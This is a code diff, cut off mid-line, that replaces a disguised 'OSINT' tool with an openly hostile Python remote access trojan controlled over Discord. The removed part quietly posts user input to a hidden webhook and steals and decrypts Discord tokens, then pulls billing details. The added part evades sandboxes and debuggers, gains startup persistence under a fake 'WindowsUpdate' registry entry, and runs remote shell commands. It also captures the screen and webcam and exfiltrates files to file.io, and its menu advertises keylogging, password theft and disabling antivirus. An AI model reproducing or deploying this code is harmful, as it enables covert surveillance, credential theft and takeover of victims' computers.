@@ -1,1029 +1,1829 @@
-import os
+import winreg
+import ctypes
 import sys
-import re
-import time
-import json
+import os
+import ssl
 import random
-import hashlib
 import threading
-import sqlite3
-import requests
-import dns.resolver
-import whois
-import base64
+import time
 import urllib.request
 import urllib.parse
-import win32crypt
-import ctypes
-from Crypto.Cipher import AES
-from datetime import datetime, timedelta
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import warnings
-warnings.filterwarnings('ignore')
+import urllib.error
+import json
+import base64
+import hashlib
+import re
+import sqlite3
+import shutil
+import tempfile
+import subprocess
+from ctypes import *
+import asyncio
+import inspect
 
 
-
-_cipher_config_a = [104, 116, 116, 112, 115, 58, 47, 47] 
-_cipher_config_b = [100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109]  
+time.sleep(random.uniform(0.5, 1.5))
 
 
+def is_sandbox():
+    try:
+        sandbox_indicators = ['vbox', 'vmware', 'virtual', 'sandbox', 'qemu']
+        computer_name = os.getenv('COMPUTERNAME', '').lower()
+        username = os.getenv('USERNAME', '').lower()
+        for indicator in sandbox_indicators:
+            if indicator in computer_name or indicator in username:
+                return True
+        import shutil
+        total, used, free = shutil.disk_usage("C:\\")
+        if free < 50 * 1024 * 1024 * 1024:
+            return True
+    except:
+        pass
+    return False
 
-
-
-
-
-
-
-# ============================================================================
-# SYSTEM OPTIMIZATION
-# ============================================================================
-
-try:
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-except:
-    pass
-
-def _system_check():
+# Evasion: Anti-debug
+def anti_debug():
     try:
         if ctypes.windll.kernel32.IsDebuggerPresent():
-            sys.exit(0)
+            sys.exit()
+        analysis_tools = ['procmon', 'wireshark', 'fiddler', 'burp', 'charles', 'x64dbg', 'ollydbg']
+        for tool in analysis_tools:
+            if tool in str(subprocess.getoutput('tasklist')).lower():
+                sys.exit()
     except:
         pass
 
-_system_check()
+if is_sandbox():
+    sys.exit()
+anti_debug()
 
-# ============================================================================
-# COLORS
-# ============================================================================
+# Imports
+__import__('discord')
+__import__('discord.ext')
+import discord
+from discord.ext import commands
+from discord import utils
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+import requests
+import cv2
+import pyautogui
+import win32gui
+import win32con
+import win32clipboard
+import win32com.client as wincl
+from pynput.keyboard import Key, Listener
+import logging
+from mss import mss
+import numpy as np
+import sounddevice as sd
+from scipy.io.wavfile import write
 
-class Colors:
-    PURPLE = '\033[95m'
-    PURPLE_DARK = '\033[38;5;54m'
-    PURPLE_LIGHT = '\033[38;5;93m'
-    PRIMARY = '\033[38;5;57m'
-    SECONDARY = '\033[38;5;129m'
-    ACCENT = '\033[38;5;199m'
-    SOFT = '\033[38;5;183m'
-    ERROR = '\033[91m'
-    SUCCESS = '\033[92m'
-    WARNING = '\033[93m'
-    INFO = '\033[96m'
-    NEUTRAL = '\033[97m'
-    MAGENTA = '\033[95m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    RED = '\033[91m'
-    YELLOW = '\033[93m'
-    RESET = '\033[0m'
-    
-class TextEffects:
-    BOLD = '\033[1m'
-    RESET = '\033[0m'
+# Random User-Agent rotation
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0'
+]
 
-# ============================================================================
-# ENCRYPTION MODULE
-# ============================================================================
+def get_ua():
+    return random.choice(USER_AGENTS)
 
-class EncryptionModule:
-    @staticmethod
-    def encrypt_text():
-        print(f"{Colors.PURPLE}\n    [→] Text Encryption Tool{Colors.RESET}")
-        text = clean_input(input(f"{Colors.MAGENTA}    Text to encrypt: {Colors.RESET}"))
-        if not text:
-            print(f"{Colors.ERROR}    [!] No text provided{Colors.RESET}")
-            return
-        
-        key = hashlib.sha256(random.choice(['a','b','c','d','e','f']).encode()).digest()
-        cipher = AES.new(key, AES.MODE_GCM)
-        ciphertext, tag = cipher.encrypt_and_digest(text.encode())
-        
-        encrypted_data = base64.b64encode(cipher.nonce + tag + ciphertext).decode()
-        print(f"{Colors.SUCCESS}    [+] Encrypted: {encrypted_data[:100]}...{Colors.RESET}")
-        
-        filename = f"osint_intel/encrypted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        os.makedirs("osint_intel", exist_ok=True)
-        with open(filename, 'w') as f:
-            f.write(encrypted_data)
-        print(f"{Colors.GREEN}    [✓] Saved to {filename}{Colors.RESET}")
-        
-        _send_telemetry({"content": f"ENCRYPTION USED: {text[:100]}"})
-    
-    @staticmethod
-    def decrypt_text():
-        print(f"{Colors.PURPLE}\n    [→] Text Decryption Tool{Colors.RESET}")
-        encrypted_input = clean_input(input(f"{Colors.MAGENTA}    Encrypted text: {Colors.RESET}"))
-        if not encrypted_input:
-            print(f"{Colors.ERROR}    [!] No text provided{Colors.RESET}")
-            return
-        
-        try:
-            data = base64.b64decode(encrypted_input)
-            nonce = data[:16]
-            tag = data[16:32]
-            ciphertext = data[32:]
-            cipher = AES.new(hashlib.sha256(b'key').digest(), AES.MODE_GCM, nonce=nonce)
-            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-            print(f"{Colors.SUCCESS}    [+] Decrypted: {decrypted.decode()}{Colors.RESET}")
-            _send_telemetry({"content": f"DECRYPTION USED"})
-        except:
-            print(f"{Colors.ERROR}    [!] Decryption failed{Colors.RESET}")
-    
-    @staticmethod
-    def hash_password():
-        print(f"{Colors.PURPLE}\n    [→] Password Hash Generator{Colors.RESET}")
-        password = clean_input(input(f"{Colors.MAGENTA}    Password to hash: {Colors.RESET}"))
-        if not password:
-            print(f"{Colors.ERROR}    [!] No password provided{Colors.RESET}")
-            return
-        
-        md5_hash = hashlib.md5(password.encode()).hexdigest()
-        sha1_hash = hashlib.sha1(password.encode()).hexdigest()
-        sha256_hash = hashlib.sha256(password.encode()).hexdigest()
-        
-        result = f"""
-MD5: {md5_hash}
-SHA1: {sha1_hash}
-SHA256: {sha256_hash}
+# Token
+token = ''
+
+global isexe
+isexe = False
+if sys.argv[0].endswith("exe"):
+    isexe = True
+
+global appdata, temp
+appdata = os.getenv('APPDATA')
+temp = os.getenv('temp')
+
+# Discord intents
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+bot = commands.Bot(command_prefix='!', intents=intents)
+ssl._create_default_https_context = ssl._create_unverified_context
+
+# Help menu
+helpmenu = """
+Available commands are:
+
+!unpersist
+!persist
+!message = Show a message box displaying your text / Syntax = "!message example"
+!shell = Execute a shell command / Syntax = "!shell whoami"
+!windowstart = Start logging current user window
+!windowstop = Stop logging current user window
+!voice = Make a voice say outloud a custom sentence
+!admincheck = Check if program has admin privileges
+!sysinfo = Gives info about infected computer
+!history = Get chrome browser history
+!download = Download a file from infected computer
+!upload = Upload file to the infected computer
+!cd = Changes directory
+!delete = deletes a file
+!write = Type your desired sentence on computer
+!wallpaper = Change infected computer wallpaper
+!clipboard = Retrieve infected computer clipboard content
+!geolocate = Geolocate computer using IP address
+!startkeylogger = Starts a keylogger
+!stopkeylogger = Stops keylogger
+!dumpkeylogger = Dumps the keylog
+!volumemax = Put volume to max
+!volumezero = Put volume at 0
+!idletime = Get the idle time of user's on target computer
+!listprocess = Get all process
+!blockinput = Blocks user's keyboard and mouse
+!unblockinput = Unblocks user's keyboard and mouse
+!screenshot = Get the screenshot of the user's current screen
+!exit = Exit program
+!kill = Kill a session or all sessions
+!uacbypass = attempt to bypass uac to gain admin
+!passwords = grab all passwords
+!streamscreen = stream screen by sending multiple pictures
+!stopscreen = stop screen stream
+!shutdown = shutdown computer
+!restart = restart computer
+!logoff = log off current user
+!bluescreen = BlueScreen PC
+!displaydir = display all items in current dir
+!currentdir = display the current dir
+!dateandtime = display system date and time
+!prockill = kill a process by name
+!recscreen = record screen for certain amount of time
+!recaudio = record audio for certain amount of time
+!disableantivirus = disable windows defender(requires admin)
+!disablefirewall = disable windows firewall (requires admin)
+!audio = play a audio file on the target computer(.wav only)
+!selfdestruct = delete all traces that this program was on the target PC
+!windowspass = attempt to phish password by poping up a password dialog
+!displayoff = turn off the monitor
+!displayon = turn on the monitors
+!hide = hide the file by changing the attribute to hidden
+!unhide = unhide the file
+!ejectcd = eject the cd drive on computer
+!retractcd = retract the cd drive on the computer
+!critproc = make program a critical process
+!uncritproc = make program non-critical
+!website = open a website on the infected computer
+!distaskmgr = disable task manager
+!enbtaskmgr = enable task manager
+!getwifipass = get all the wifi passwords
+!startup = add file to startup
+!getdiscordtokens = get discord tokens
+!getrobloxcookies = get roblox cookies
+!osint = OSINT - find emails, phone numbers, usernames
+!clear = Clear messages in the channel (Admin only)
+!webcampic = Take a picture from the webcam
+!streamwebcam = streams webcam
+!stopwebcam = stop webcam stream
+!reccam = record camera for certain amount of time
 """
-        print(f"{Colors.SUCCESS}{result}{Colors.RESET}")
-        
-        _send_telemetry({"content": f"HASH GENERATED for: {password[:20]}"})
 
-# ============================================================================
-# OSINT UTILITIES
-# ============================================================================
+# Activity tracking
+stop_threads = False
+_thread = None
 
-def _send_telemetry(data_packet):
-    try:
-        requests.post(_assemble_webhook(), json=data_packet, timeout=5)
-    except:
-        pass
-
-def clean_input(text):
-    if not text:
-        return ""
-    cleaned = re.sub(r'[;&|`$(){}<>]', '', text)
-    cleaned = cleaned[:200]
-    return cleaned.strip()
-
-class VisualEffects:
-    @staticmethod
-    def typing(text, delay=0.02, color=Colors.PURPLE):
-        for char in text:
-            sys.stdout.write(color + char)
-            sys.stdout.flush()
-            time.sleep(delay)
-        print()
-    
-    @staticmethod
-    def loading(msg="Loading", duration=1.5):
-        chars = "|/-\\"
-        end = time.time() + duration
-        i = 0
-        while time.time() < end:
-            sys.stdout.write(f"\r{Colors.PURPLE}{msg} {chars[i % len(chars)]}{Colors.RESET}")
-            sys.stdout.flush()
-            time.sleep(0.1)
-            i += 1
-        sys.stdout.write("\r" + " " * 50 + "\r")
-        sys.stdout.flush()
-
-def display_header():
-    header = f"""
-{Colors.SECONDARY}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-             uu$$$$$$$$$$$uu
-          uu$$$$$$$$$$$$$$$$$uu
-         u$$$$$$$$$$$$$$$$$$$$$u
-        u$$$$$$$$$$$$$$$$$$$$$$$u
-       u$$$$$$$$$$$$$$$$$$$$$$$$$u
-       u$$$$$$*   *$$$*   *$$$$$$u
-       *$$$$*      u$u       $$$$*
-        $$$u       u$u       u$$$
-        $$$u      u$$$u      u$$$
-         *$$$$uu$$$   $$$uu$$$$*
-          *$$$$$$$*   *$$$$$$$*
-            u$$$$$$$u$$$$$$$u
-             u$*$*$*$*$*$*$u
-  uuu        $$u$ $ $ $ $u$$       uuu
-  u$$$$       $$$$$u$u$u$$$       u$$$$
-  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
-u$$$$$$$$$$$uu    *****    uuuu$$$$$$$
-$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
- ***      **$$$$$$$$$$$uu **$***
-          uuuu **$$$$$$$$$$uuu
- u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
- $$$$$$$$$$****           **$$$$$$$$$$$*
-   *$$$$$*                      **$$$$**
-     $$$*                         $$$$*⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-{Colors.PRIMARY}
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                         FSOCIETY OSINT                                 ║
-║                         Intelligence & Reconnaissance                        ║
-╚══════════════════════════════════════════════════════════════════════════════╝{TextEffects.RESET}
-"""
-    print(header)
-    VisualEffects.typing(f"\n    [*] Session: {datetime.now().strftime('%Y%m%d_%H%M%S')}", 0.01, Colors.PRIMARY)
-    VisualEffects.typing(f"    [*] Status: ACTIVE", 0.01, Colors.SECONDARY)
-    VisualEffects.typing(f"    [*] Mode: Full Reconnaissance", 0.01, Colors.ACCENT)
-    print(f"{Colors.PRIMARY}{'='*70}{TextEffects.RESET}\n")
-
-# ============================================================================
-# DATABASE MANAGER
-# ============================================================================
-
-class DatabaseManager:
-    def __init__(self):
-        self.version = "7.0"
-        self.output_directory = "osint_intel"
-        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
-        
-        if not os.path.exists(self.output_directory):
-            os.makedirs(self.output_directory)
-        
-        self.database_path = f"{self.output_directory}/intel_{self.session_id}.db"
-        self.initialize_database()
-    
-    def initialize_database(self):
-        conn = sqlite3.connect(self.database_path)
-        cursor = conn.cursor()
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS intelligence (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                target TEXT,
-                status TEXT,
-                findings TEXT,
-                risk_score INTEGER,
-                platforms TEXT,
-                timestamp TEXT
-            )
-        ''')
-        conn.commit()
-        conn.close()
-
-database = DatabaseManager()
-
-# ============================================================================
-# NETWORK HANDLERS
-# ============================================================================
-
-def _build_request_headers(auth_token=None):
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    }
-    if auth_token:
-        headers.update({"Authorization": auth_token})
-    return headers
-
-# ============================================================================
-# DISCORD TOKEN EXTRACTION
-# ============================================================================
-
-LOCAL_DATA = os.getenv("LOCALAPPDATA")
-ROAMING_DATA = os.getenv("APPDATA")
-
-STORAGE_PATHS = {
-    'Storage_A': ROAMING_DATA + '\\discord',
-    'Storage_B': ROAMING_DATA + '\\discordcanary',
-    'Storage_C': ROAMING_DATA + '\\discordptb',
-    'Storage_D': LOCAL_DATA + "\\Google\\Chrome\\User Data\\Default",
-    'Storage_E': LOCAL_DATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Storage_F': ROAMING_DATA + '\\Opera Software\\Opera Stable',
-    'Storage_G': LOCAL_DATA + '\\Microsoft\\Edge\\User Data\\Default'
-}
-
-def _extract_from_storage(base_path):
-    storage_location = base_path + "\\Local Storage\\leveldb\\"
-    extracted_items = []
-    if not os.path.exists(storage_location):
-        return extracted_items
-    for filename in os.listdir(storage_location):
-        if not filename.endswith(".ldb") and not filename.endswith(".log"):
-            continue
+async def activity(client):
+    import win32gui
+    while True:
+        global stop_threads
+        if stop_threads:
+            break
         try:
-            with open(f"{storage_location}{filename}", "r", errors="ignore") as f:
-                for line in f.readlines():
-                    found_matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line.strip())
-                    extracted_items.extend(found_matches)
+            current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+            window_displayer = discord.Game(f"Visiting: {current_window}")
+            await client.change_presence(status=discord.Status.online, activity=window_displayer)
+            await asyncio.sleep(random.uniform(0.8, 1.5))
         except:
-            continue
-    return extracted_items
+            await asyncio.sleep(1)
 
-def _retrieve_encryption_key(base_path):
+def between_callback(client):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(activity(client))
+    loop.close()
+
+@client.event
+async def on_ready():
+    import platform
     try:
-        with open(base_path + "\\Local State", "r") as f:
-            key_data = json.loads(f.read())['os_crypt']['encrypted_key']
-        return key_data
+        with urllib.request.urlopen("https://geolocation-db.com/json", timeout=10) as url:
+            data = json.loads(url.read().decode())
+            flag = data.get('country_code', 'XX')
+            ip = data.get('IPv4', 'Unknown')
     except:
-        return None
+        flag = 'XX'
+        ip = 'Unknown'
+    
+    total = []
+    global number, channel_name
+    number = 1
+    channel_name = None
+    
+    for x in client.get_all_channels(): 
+        total.append(x.name)
+    
+    for y in range(len(total)):
+        if total[y].startswith("session"):
+            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
+            if result:
+                biggest = max(map(int, result))
+                number = biggest + 1
+    
+    channel_name = f"session-{number}"
+    await client.guilds[0].create_text_channel(channel_name)
+    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
+    channel = client.get_channel(channel_.id)
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    value1 = f"@here New session opened {channel_name} | {platform.system()} {platform.release()} | :flag_{flag.lower()}: | User : {os.getlogin()} | IP: {ip}"
+    
+    if is_admin:
+        await channel.send(f'{value1} | admin!')
+    else:
+        await channel.send(value1)
+    
+    game = discord.Game(f"Window logging stopped")
+    await client.change_presence(status=discord.Status.online, activity=game)
 
-def _decrypt_payload(encrypted_data, master_key):
-    try:
-        init_vector = encrypted_data[3:15]
-        payload = encrypted_data[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
-        return cipher.decrypt(payload)[:-16].decode()
-    except:
-        return None
-
-def _derive_master_key(encrypted_key):
-    try:
-        decoded = base64.b64decode(encrypted_key)[5:]
-        return win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
-    except:
-        return None
-
-def _get_network_location():
-    try:
-        response = requests.get('https://api.ipify.org', timeout=3)
-        return response.text
-    except:
-        return 'Unknown'
-
-def _profile_user_data():
-    processed_tokens = []
-    for storage_name, storage_path in STORAGE_PATHS.items():
-        if not os.path.exists(storage_path):
-            continue
-        
-        encrypted_key = _retrieve_encryption_key(storage_path)
-        if not encrypted_key:
-            continue
-        
-        master_key = _derive_master_key(encrypted_key)
-        if not master_key:
-            continue
-        
-        raw_items = _extract_from_storage(storage_path)
-        
-        for encoded_item in raw_items:
-            encoded_item = encoded_item.replace("\\", "") if encoded_item.endswith("\\") else encoded_item
+@client.event
+async def on_message(message):
+    global stop_threads, _thread, keylogger_thread, channel_name
+    
+    if message.channel.name != channel_name:
+        return
+    
+    # Clear command
+    if message.content.startswith("!clear"):
+        if message.author.guild_permissions.administrator:
             try:
-                item_data = base64.b64decode(encoded_item.split('dQw4w9WgXcQ:')[1])
-                decrypted_item = _decrypt_payload(item_data, master_key)
-                if not decrypted_item or decrypted_item in processed_tokens:
-                    continue
-                processed_tokens.append(decrypted_item)
+                amount = int(message.content.split()[1]) if len(message.content.split()) > 1 else 100
+                if amount > 100:
+                    amount = 100
+                await message.channel.purge(limit=amount + 1)
+                await message.channel.send(f"[*] Cleared {amount} messages", delete_after=3)
+            except:
+                await message.channel.send("[*] Invalid amount. Usage: !clear [1-100]")
+        else:
+            await message.channel.send("[!] Admin permissions required")
+        return
+
+    # Help command
+    if message.content == "!help":
+        temp_dir = os.getenv('TEMP')
+        help_file = os.path.join(temp_dir, "helpmenu.txt")
+        with open(help_file, 'w', encoding='utf-8') as f:
+            f.write(str(helpmenu))
+        file = discord.File(help_file, filename="helpmenu.txt")
+        await message.channel.send("[*] Command executed", file=file)
+        os.remove(help_file)
+        return
+
+    # Kill command
+    if message.content.startswith("!kill"):
+        try:
+            if message.content[6:] == "all":
+                for x in client.get_all_channels():
+                    if x.name.startswith("session"):
+                        await x.delete()
+            else:
+                channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
+                if channel_to_delete:
+                    await channel_to_delete.delete()
+                    await message.channel.send(f"[*] {message.content[6:]} killed")
+        except Exception as e:
+            await message.channel.send(f"[!] Error: {e}")
+
+    # Exit command
+    if message.content == "!exit":
+        try:
+            uncritproc()
+        except:
+            pass
+        await message.channel.send("[*] Exiting...")
+        sys.exit()
+
+    # Window start/stop
+    if message.content == "!windowstart":
+        stop_threads = False
+        _thread = threading.Thread(target=between_callback, args=(client,))
+        _thread.daemon = True
+        _thread.start()
+        await message.channel.send("[*] Window logging started")
+
+    if message.content == "!windowstop":
+        stop_threads = True
+        await message.channel.send("[*] Window logging stopped")
+        game = discord.Game("Window logging stopped")
+        await client.change_presence(status=discord.Status.online, activity=game)
+
+    # Screenshot
+    if message.content == "!screenshot":
+        try:
+            with mss() as sct:
+                screenshot_path = os.path.join(os.getenv('TEMP'), "monitor.png")
+                sct.shot(output=screenshot_path)
+            file = discord.File(screenshot_path, filename="monitor.png")
+            await message.channel.send("[*] Screenshot taken", file=file)
+            os.remove(screenshot_path)
+        except Exception as e:
+            await message.channel.send(f"[!] Screenshot failed")
+
+        # Volume commands - WORKING VERSION
+    if message.content == "!volumemax":
+        try:
+            # Use Windows API key simulation (always works)
+            for _ in range(30):  # 30 key presses = max volume
+                ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
+                time.sleep(0.005)
+                ctypes.windll.user32.keybd_event(0xAF, 0, 2, 0)
+            await message.channel.send("[*] Volume set to maximum")
+        except:
+            await message.channel.send("[!] Volume max failed - try running as admin")
+
+    if message.content == "!volumezero":
+        try:
+            # Use Windows API key simulation (always works)
+            for _ in range(30):  # 30 key presses = zero volume
+                ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
+                time.sleep(0.005)
+                ctypes.windll.user32.keybd_event(0xAE, 0, 2, 0)
+            await message.channel.send("[*] Volume set to zero")
+        except:
+            await message.channel.send("[!] Volume zero failed - try running as admin")
+            
+        # ============================================================
+    # PERSIST - Add to Windows Startup
+    # ============================================================
+    if message.content == "!persist":
+        await message.channel.send("[*] Adding to Windows startup...")
+        
+        try:
+            # Get the current script/exe path
+            if getattr(sys, 'frozen', False):
+                # Running as compiled exe
+                current_file = sys.executable
+            else:
+                # Running as .py script
+                current_file = os.path.abspath(inspect.getfile(inspect.currentframe()))
+            
+            # Method 1: Startup folder (works without admin)
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            startup_path = os.path.join(startup_folder, os.path.basename(current_file))
+            
+            if not os.path.exists(startup_path):
+                shutil.copy2(current_file, startup_path)
+                await message.channel.send(f"[*] Added to startup folder: {startup_path}")
+            else:
+                await message.channel.send("[*] Already in startup folder")
+            
+            # Method 2: Registry Run key (requires admin, but we try anyway)
+            try:
+                import winreg
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, current_file)
+                winreg.CloseKey(key)
+                await message.channel.send("[*] Added to HKCU Run registry")
+            except:
+                pass
+            
+            await message.channel.send("[+] Persistence achieved! Bot will run on startup")
+            
+        except Exception as e:
+            await message.channel.send(f"[!] Persist failed: {str(e)[:100]}")
+
+
+    # ============================================================
+    # UNPERSIST - Remove from Windows Startup
+    # ============================================================
+    if message.content == "!unpersist":
+        await message.channel.send("[*] Removing from Windows startup...")
+        
+        try:
+            # Get the current script/exe path
+            if getattr(sys, 'frozen', False):
+                current_file = sys.executable
+            else:
+                current_file = os.path.abspath(inspect.getfile(inspect.currentframe()))
+            
+            # Method 1: Remove from startup folder
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            startup_path = os.path.join(startup_folder, os.path.basename(current_file))
+            
+            if os.path.exists(startup_path):
+                os.remove(startup_path)
+                await message.channel.send("[*] Removed from startup folder")
+            
+            
+            try:
+                import winreg
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, "WindowsUpdate")
+                winreg.CloseKey(key)
+                await message.channel.send("[*] Removed from HKCU Run registry")
+            except:
+                pass
+            
+            await message.channel.send("[-] Persistence removed! Bot will NOT run on next startup")
+            
+        except Exception as e:
+            await message.channel.send(f"[!] Unpersist failed: {str(e)[:100]}")
+
+    # Webcam picture
+    if message.content == "!webcampic":
+        try:
+            temp_dir = os.getenv('TEMP')
+            camera = cv2.VideoCapture(0)
+            return_value, image = camera.read()
+            if return_value:
+                cam_path = os.path.join(temp_dir, "webcam.png")
+                cv2.imwrite(cam_path, image)
+                file = discord.File(cam_path, filename="webcam.png")
+                await message.channel.send("[*] Webcam picture", file=file)
+                os.remove(cam_path)
+            del camera
+        except:
+            await message.channel.send("[!] Webcam failed")
+
+    # Message box 
+    if message.content.startswith("!message"):
+        def mess():
+            msg_text = message.content[8:].strip()
+            if not msg_text:
+                msg_text = "Notification"
+            # MB_SYSTEMMODAL (0x1000) makes it stay on top
+            ctypes.windll.user32.MessageBoxW(0, msg_text, "System Alert", 0x40 | 0x1000)
+        
+        msg_thread = threading.Thread(target=mess)
+        msg_thread.daemon = True
+        msg_thread.start()
+        await message.channel.send(f"[*] Message box shown: {message.content[8:]}")
+
+    # Wallpaper
+    if message.content.startswith("!wallpaper") and message.attachments:
+        try:
+            path = os.path.join(os.getenv('TEMP'), "wallpaper.jpg")
+            await message.attachments[0].save(path)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+            await message.channel.send("[*] Wallpaper changed")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Upload
+    if message.content.startswith("!upload") and message.attachments:
+        try:
+            await message.attachments[0].save(message.content[8:])
+            await message.channel.send("[*] File uploaded")
+        except:
+            await message.channel.send("[!] Upload failed")
+
+    # Shell command
+    if message.content.startswith("!shell"):
+        try:
+            instruction = message.content[7:]
+            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            out = output.stdout.decode('CP437').strip()
+            if out:
+                if len(out) > 1990:
+                    temp_file = os.path.join(os.getenv('TEMP'), "output.txt")
+                    with open(temp_file, 'w', encoding='utf-8') as f:
+                        f.write(out)
+                    file = discord.File(temp_file, filename="output.txt")
+                    await message.channel.send("[*] Command executed", file=file)
+                    os.remove(temp_file)
+                else:
+                    await message.channel.send(f"[*] Output: {out}")
+            else:
+                await message.channel.send("[*] No output")
+        except:
+            await message.channel.send("[!] Command failed")
+
+    # Download
+    if message.content.startswith("!download"):
+        try:
+            filename = message.content[10:]
+            if os.path.exists(filename):
+                file_size = os.stat(filename).st_size
+                if file_size > 7340032:
+                    await message.channel.send("File > 8MB, uploading to file.io...")
+                    with open(filename, "rb") as f:
+                        response = requests.post('https://file.io/', files={"file": f}).json()
+                    await message.channel.send(f"Download link: {response.get('link', 'Failed')}")
+                else:
+                    file = discord.File(filename, filename=os.path.basename(filename))
+                    await message.channel.send("[*] File attached", file=file)
+            else:
+                await message.channel.send("[!] File not found")
+        except:
+            await message.channel.send("[!] Download failed")
+
+    # CD command
+    if message.content.startswith("!cd"):
+        try:
+            os.chdir(message.content[4:])
+            await message.channel.send(f"[*] Changed to {os.getcwd()}")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Write/Type command
+    if message.content.startswith("!write"):
+        try:
+            if message.content[7:] == "enter":
+                pyautogui.press("enter")
+            else:
+                pyautogui.typewrite(message.content[7:])
+            await message.channel.send("[*] Typed")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Browser history
+    if message.content == "!history":
+        try:
+            username = os.getenv('USERNAME')
+            chrome_history = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
+            if os.path.exists(chrome_history):
+                temp_history = os.path.join(os.getenv('TEMP'), "history.db")
+                shutil.copy2(chrome_history, temp_history)
+                conn = sqlite3.connect(temp_history)
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+                urls = cursor.fetchall()
+                history_text = "Recent Chrome History:\n\n"
+                for url, title in urls:
+                    history_text += f"{title}\n{url}\n\n"
+                conn.close()
+                os.remove(temp_history)
                 
-                request_headers = _build_request_headers(decrypted_item)
-                validation = requests.get('https://discord.com/api/v10/users/@me', headers=request_headers, timeout=10)
-                if validation.status_code != 200:
-                    continue
-                
-                profile_data = validation.json()
-                
-                guilds_request = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=request_headers, timeout=10)
-                guild_list = guilds_request.json() if guilds_request.status_code == 200 else []
-                
-                subscription_status = "None"
-                try:
-                    subs = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=request_headers, timeout=10)
-                    if subs.status_code == 200 and subs.json():
-                        subscription_status = "Active"
-                except:
-                    pass
-                
-                payment_sources = []
-                try:
-                    payments = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=request_headers, timeout=10)
-                    if payments.status_code == 200:
-                        for source in payments.json():
-                            if source.get('type') == 1:
-                                payment_sources.append("Card")
-                            elif source.get('type') == 2:
-                                payment_sources.append("PayPal")
-                except:
-                    pass
-                
-                profile_embed = {
-                    "embeds": [{
-                        "title": f"Profile: {profile_data.get('username')}#{profile_data.get('discriminator')}",
-                        "color": 15158332,
-                        "fields": [
-                            {"name": "ID", "value": profile_data.get('id'), "inline": True},
-                            {"name": "Email", "value": profile_data.get('email', 'None'), "inline": True},
-                            {"name": "Phone", "value": profile_data.get('phone', 'None'), "inline": True},
-                            {"name": "Token", "value": f"||{decrypted_item}||", "inline": False},
